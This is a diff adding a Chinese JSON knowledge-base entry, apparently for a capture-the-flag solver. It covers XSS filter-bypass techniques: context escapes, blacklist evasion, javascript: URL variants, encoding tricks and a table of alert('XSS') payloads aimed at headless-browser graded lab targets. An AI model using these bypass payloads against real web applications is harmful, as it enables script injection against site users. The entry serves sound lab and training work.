@@ -1,0 +1,60 @@
+{
+ "id": "web-xss-context-bypass",
+ "title": "XSS 上下文绕过速查(过滤器黑名单/属性注入/URL 白名单/编码叠加,靶机自渲染判分)",
+ "vuln_pattern": "用户输入被回显进 HTML 且有一层或多层过滤(关键词黑名单、事件属性黑名单、URL 协议白名单、大小写/编码变换),需构造在'该上下文'里能执行 JS 的 payload;典型判分:靶机 headless(PhantomJS/无头浏览器)加载回显页,alert('XSS') 弹出即在响应里回 flag",
+ "fingerprint": [
+  "xss",
+  "XSS",
+  "跨站脚本",
+  "alert(",
+  "onerror",
+  "onload",
+  "javascript:",
+  "过滤器绕过",
+  "htmlsanitizer",
+  "反射",
+  "cross-site",
+  "跨站",
+  "payload弹窗",
+  "sanitizer bypass"
+ ],
+ "exploit_steps": [
+  "先确定回显【上下文】再写 payload:①裸 HTML 体 ②标签属性内(value=\"...\") ③<script> 字符串内 ④事件处理器内 ⑤注释/CDATA 内。上下文决定逃逸所需的第一步(闭引号/闭标签/注释符),不问上下文直接丢 <script> 是最大浪费。",
+  "关键词黑名单绕过按序试:大小写混合 <ScRiPt>/<ImG、双写绕过(scrscriptipt 删一次后还原)、拆分表达式(window['al'+'ert'] 拼接调用)、事件属性轮换(onerror/onload/onfocus+autofocus/onanimationstart/onpointerover、<svg><animate onbegin=)、标签轮换(img/body/svg/details/iframe/object/video/audio/marquee)。",
+  "属性内上下文:先闭引号(+空格)逃出属性再注入事件;< 和 > 被过滤时用事件属性表达式(alert 由 onxxx= 触发不需要新标签);引号被转义时看能否不闭(事件值用无引号写法 onfocus=alert(1) autofocus)。",
+  "URL 协议白名单(http/https):试 javascript: 的变形—— java\tscript:、jav\tascript:、data:text/html;base64、//协议相对 + 自己页面内二次跳转;URL 上下文里 href=\"javascript:...\"、src=\"javascript:...\" 的弹窗不需要 <>。",
+  "编码叠加:HTML 实体(&#x61;&#x6c;...)、URL 编码、Unicode 转义(\\u0061lert)、JS 模板串;先弄清解码顺序(HTML 实体 → JS 层),payload 在'上一层解码后恰好是下一层语法'为准。",
+  "交互环境判分:很多自动判分靶场是服务端起 headless 浏览器 加载你的页面,检测 alert('XSS') 含大写 XSS 即回 flag——payload 里弹窗字符串的大小写/内容要严格按题目判定要求写,并确认 alert 是全局调用而非被 shadow。",
+  "现成 payload 语料在镜像内:grep -i xss /opt/kb/INDEX.txt → PayloadsAllTheThings/XSS Injection/(含过滤器绕过大表),命中黑名单单词先查表再自造。"
+ ],
+ "key_payloads": [
+  "# 上下文速查(按回显位置)\n# ①HTML体: <script>alert('XSS')</script> / <img src=x onerror=alert('XSS')>\n# ②属性内: \" onfocus=alert('XSS') autofocus x=\" / ' onerror=alert('XSS') src=x\n# ③<script>串内: ';alert('XSS');//   或闭合标签 </script><img src=x onerror=alert('XSS')>\n# ④URL/href: javascript:alert('XSS')  (大小写变形 JaVaScRiPt:)",
+  "# 黑名单轮换表\n# script被禁: <svg onload=alert('XSS')> <body onpageshow=alert('XSS')> <details open ontoggle=alert('XSS')>\n# alert被禁: window['al'+'ert']('XSS') / confirm('XSS') / prompt('XSS')  (先确认判分只认alert)\n# 括号被禁: alert`XSS` (反引号模板串)\n# 空格被禁: <img/src=x/onerror=alert('XSS')> (斜杠代空格)"
+ ],
+ "category": "web",
+ "cve": [],
+ "tags": [
+  "xss",
+  "filter-bypass",
+  "context-escape",
+  "event-handler",
+  "url-whitelist",
+  "encoding-bypass",
+  "headless-oracle"
+ ],
+ "source": "writeup 提炼(自动判分靶场机制分析:服务端 headless 渲染判 alert 即在响应回 flag)",
+ "source_tier": "seed",
+ "preconditions": [
+  "输入回显进 HTML 且存在过滤(黑名单/白名单/编码)",
+  "判分 oracle 可观察:headless 渲染后响应回 flag、或管理员 bot 行为/OOB 回调"
+ ],
+ "verify_oracle": "靶机响应直接返回 flag(判分型),或 payload 触发的请求到达你控制的 OOB/日志端点",
+ "pitfalls": [
+  "不先看回显位置就盲发 <script>——属性/JS 串上下文里它只是文本",
+  "判分型靶场对弹窗内容有精确要求(alert('XSS') 大写 XSS)——大小写不符等于没触发",
+  "黑名单是'删一次'型时用双写;是'拒绝请求'型时双写无效,换同义结构",
+  "多轮过滤叠加时从最外层逐层剥:每过一层用最小探针确认(先 alert(1) 简单形,过筛后再改成判分要求的字符串)"
+ ],
+ "anti_fingerprint": [],
+ "created_ts": 0.0
+}
